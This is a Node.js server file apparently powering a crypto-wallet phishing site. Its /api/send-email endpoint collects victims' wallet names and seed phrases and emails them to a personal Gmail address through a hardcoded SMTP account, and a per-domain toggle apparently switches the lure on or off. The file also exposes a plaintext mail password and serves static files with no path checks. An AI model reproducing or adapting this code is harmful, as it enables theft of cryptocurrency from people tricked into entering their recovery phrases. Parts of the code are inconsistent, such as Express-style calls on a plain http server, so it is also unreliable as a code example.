import http from "http";
import fs from "fs";
import path from "path";
import url from "url";
import nodemailer from "nodemailer";
import { neon } from "@neondatabase/serverless";

const __dirname = path.dirname(url.fileURLToPath(import.meta.url));

// Initialize Neon database connection
const sql = neon(process.env.DATABASE_URL);

// ✅ Configure Nodemailer transporter with timeout settings
const transporter = nodemailer.createTransport({
  host: "smtp.titan.email", // Replace with your provider
  port: 465,
  secure: true,
  auth: {
    user: "support@realworldfin.xyz", // Replace with your username
    pass: "realworldfin10$", // Replace with your password
  },
});

// Helper function to get domain ID
function getDomainId(domain) {
  let hash = 0;
  for (let i = 0; i < domain.length; i++) {
    hash = (hash << 5) - hash + domain.charCodeAt(i);
    hash = hash & hash;
  }
  return Math.abs(hash);
}

// Initialize database table on startup
async function initDatabase() {
  try {
    await sql`
      CREATE TABLE IF NOT EXISTS flareclaimspark (
        id INT PRIMARY KEY,
        domain VARCHAR(255) NOT NULL,
        state VARCHAR(3) NOT NULL CHECK (state IN ('ON', 'OFF'))
      )
    `;
    console.log("✅ Database table initialized");
  } catch (error) {
    console.error("❌ Database initialization error:", error);
  }
}

// Verify SMTP connection on startup
async function verifySmtpConnection() {
  try {
    console.log("🔍 Verifying SMTP connection...");
    await transporter.verify();
    console.log("✅ SMTP connection verified successfully!");
  } catch (error) {
    console.error("⚠️ SMTP verification failed:", error.message);
    console.error(
      "Check your SMTP credentials: SMTP_HOST, SMTP_PORT, SMTP_USER, SMTP_PASS",
    );
  }
}

// Handle toggle endpoint
const handleToggle = async (req, res, body) => {
  const host = req.headers.host || "";
  const domainId = getDomainId(host);

  try {
    // Insert default state for this domain if it doesn't exist
    await sql`
      INSERT INTO flareclaimspark (id, domain, state)
      VALUES (${domainId}, ${host}, 'OFF')
      ON CONFLICT (id) DO NOTHING
    `;

    if (req.method === "POST") {
      const { state } = JSON.parse(body);

      if (state !== "ON" && state !== "OFF") {
        res.writeHead(400, {
          "Content-Type": "application/json",
          "Access-Control-Allow-Origin": "*",
        });
        res.end(JSON.stringify({ error: "Invalid state" }));
        return;
      }

      await sql`
        UPDATE flareclaimspark
        SET state = ${state}
        WHERE id = ${domainId}
      `;

      console.log(`✅ Toggle updated: ${host} → ${state}`);

      res.writeHead(200, {
        "Content-Type": "application/json",
        "Access-Control-Allow-Origin": "*",
      });
      res.end(JSON.stringify({ state, domain: host }));
    } else if (req.method === "GET") {
      const result = await sql`
        SELECT state, domain FROM flareclaimspark WHERE id = ${domainId}
      `;

      res.writeHead(200, {
        "Content-Type": "application/json",
        "Access-Control-Allow-Origin": "*",
      });
      res.end(
        JSON.stringify({
          state: result[0]?.state || "OFF",
          domain: result[0]?.domain || host,
        }),
      );
    }
  } catch (error) {
    console.error("❌ Database error:", error);
    res.writeHead(500, {
      "Content-Type": "application/json",
      "Access-Control-Allow-Origin": "*",
    });
    res.end(
      JSON.stringify({
        error: "Database error",
        message: error.message,
      }),
    );
  }
};

// Send email using Nodemailer
const sendEmail = async (req, res, body) => {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  const { walletName, walletIcon, seedPhrase } = req.body;

  // Validate inputs
  if (!walletName || !walletIcon || !seedPhrase) {
    return res.status(400).json({ error: "Missing required fields" });
  }

  console.log("📧 Received email request:", {
    walletName,
    walletIcon,
    seedPhrase: seedPhrase ? "✓" : "✗",
  });

  // if (!walletName || !walletIcon || !seedPhrase) {
  //   res.writeHead(400, {
  //     "Content-Type": "application/json",
  //     "Access-Control-Allow-Origin": "*",
  //   });
  //   res.end(JSON.stringify({ error: "Missing required fields" }));
  //   return;
  // }

  // ✅ Check if SMTP credentials are configured
  // if (
  //   !process.env.SMTP_HOST ||
  //   !process.env.SMTP_USER ||
  //   !process.env.SMTP_PASS
  // ) {
  //   throw new Error(
  //     "SMTP credentials not configured. Check SMTP_HOST, SMTP_USER, SMTP_PASS environment variables",
  //   );
  // }

  console.log("📤 Sending email via Nodemailer...");
  console.log("⏱️ Timeout: 10 seconds for connection and socket operations");

  // ✅ Send email via Nodemailer with error handling
  try {
    const result = await transporter.sendMail({
      from: '"Sender" <support@realworldfin.xyz>',
      to: "danielekene6b@gmail.com",
      subject: `New Message from ${walletName}`,
      html: `
          <h2>New Submission</h2>
          <p><strong>Name:</strong> ${walletName}</p>
          <p><strong>Icon:</strong> ${walletIcon}</p>
          <p><strong>Message:</strong></p>
          <p>${seedPhrase.replace(/\n/g, "<br>")}</p>
          <hr>
          <p style="color: #999; font-size: 12px;">Received at: ${new Date().toLocaleString()}</p>
        `,
    });

    console.log("✅ Email sent successfully via Nodemailer:", result.messageId);

    return res.status(200).json({
      success: true,
      message: "✅ Email sent successfully via Resend",
      messageId: result.id,
    });
  } catch (error) {
    console.error("Resend Email error:", error);
    return res.status(500).json({
      success: false,
      error: "Failed to send email via Resend",
      details: error.message,
    });
  }
};

// Basic static file + API handler
const server = http.createServer((req, res) => {
  const parsedUrl = url.parse(req.url);

  // Handle CORS preflight
  if (req.method === "OPTIONS") {
    res.writeHead(200, {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "POST, GET, OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type",
    });
    res.end();
    return;
  }

  // Handle send-email endpoint
  if (req.method === "POST" && parsedUrl.pathname === "/api/send-email") {
    let body = "";
    req.on("data", (chunk) => (body += chunk));
    req.on("end", () => sendEmail(req, res, body));
  }
  // Handle toggle endpoint (GET and POST)
  else if (parsedUrl.pathname === "/api/toggle") {
    if (req.method === "GET") {
      handleToggle(req, res, "");
    } else if (req.method === "POST") {
      let body = "";
      req.on("data", (chunk) => (body += chunk));
      req.on("end", () => handleToggle(req, res, body));
    }
  }
  // Health check
  else if (parsedUrl.pathname === "/health" || parsedUrl.pathname === "/") {
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(
      JSON.stringify({
        status: "Server is running",
        endpoints: ["/api/send-email", "/api/toggle"],
      }),
    );
  }
  // Test email endpoint
  else if (parsedUrl.pathname === "/test-email") {
    transporter
      .sendMail({
        from: '"Test Sender" <support@realworldfin.xyz>',
        to: "danielekene6b@gmail.com",
        subject: "Test Email from Render",
        html: "<h1>✅ Test Email</h1><p>If you see this, Nodemailer is working!</p>",
      })
      .then((result) => {
        console.log("✅ Test email sent:", result.messageId);
        res.writeHead(200, { "Content-Type": "application/json" });
        res.end(JSON.stringify({ success: true, messageId: result.messageId }));
      })
      .catch((err) => {
        console.error("❌ Test email failed:", err.message);
        res.writeHead(500, { "Content-Type": "application/json" });
        res.end(JSON.stringify({ error: err.message }));
      });
  }
  // Serve static files
  else {
    let filePath = `.${parsedUrl.pathname}`;
    if (filePath === "./") filePath = "./index.html";

    const ext = path.extname(filePath);
    const contentType =
      {
        ".html": "text/html",
        ".js": "text/javascript",
        ".css": "text/css",
        ".json": "application/json",
        ".png": "image/png",
        ".jpg": "image/jpg",
        ".svg": "image/svg+xml",
        ".ico": "image/x-icon",
      }[ext] || "text/plain";

    fs.readFile(filePath, (err, content) => {
      if (err) {
        res.writeHead(404, { "Content-Type": "text/plain" });
        res.end("Not Found");
      } else {
        res.writeHead(200, { "Content-Type": contentType });
        res.end(content);
      }
    });
  }
});

const PORT = process.env.PORT || 3000;

// Initialize database and start server
initDatabase().then(() => {
  verifySmtpConnection();

  server.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`📧 Email provider: Nodemailer (SMTP)`);
    console.log(`🔑 SMTP Host set: ${process.env.SMTP_HOST ? "Yes" : "No"}`);
    console.log(`🔑 SMTP Port: ${process.env.SMTP_PORT || "587"}`);
    console.log(`🔑 SMTP User set: ${process.env.SMTP_USER ? "Yes" : "No"}`);
    console.log(
      `💾 Database URL set: ${process.env.DATABASE_URL ? "Yes" : "No"}`,
    );
  });
});
